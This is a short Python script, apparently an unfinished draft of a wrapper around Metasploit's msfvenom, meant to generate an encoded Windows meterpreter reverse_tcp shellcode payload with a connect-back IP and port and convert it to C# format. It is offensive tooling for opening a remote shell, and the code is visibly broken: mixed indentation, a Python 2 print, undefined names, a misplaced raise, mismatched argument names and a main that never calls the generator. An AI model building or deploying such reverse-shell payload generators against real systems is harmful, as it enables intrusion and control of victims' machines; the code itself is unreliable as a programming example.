#!/usr/bin/env python3
# ==============================================================================
# File:         file.py
# Author:       Cashiuus
# Created:      11-Mar-2022     -     Revised:
#
#
# ==============================================================================
__version__ = '0.0.1'
__author__ = 'Cashiuus'
__license__ = 'MIT'
__copyright__ = 'Copyright (C) 2022 Cashiuus'


import argparse
import re
import subprocess
from pathlib import Path


MSF_ROOT = Path('/usr/share/metasploit-framework/data/templates').resolve(strict=True)


def gen_payload_csharp():
    msfvenom = (msfvenom + " -p windows/meterpreter/reverse_tcp LHOST=" + args.lhost + " LPORT=" + args.lport + " -e x86/shikata_ga_nai -i 15 -f c")
   msfhandle = Popen(msfvenom, shell=True, stdout=PIPE)

    try:
       shellcode = msfhandle.communicate()[0].split("unsigned char buf[] = ")[1]
    except IndexError:
       print "Error: Do you have the right path to msfvenom?"
    raise
      #put this in a C# format
      shellcode = shellcode.replace('\\', ',0').replace('"', '').strip()[1:-1]
      return shellcode



def main():
    parser = argparse.ArgumentParser('Msfvenom generator')
    parser.add_argument('--ip', required=True, help='Connectback IP')
    parser.add_argument('-p', '--lport', required=True, help='Connectback Port')
    args = parser.parse_args()



if __name__ == '__main__':
    main()
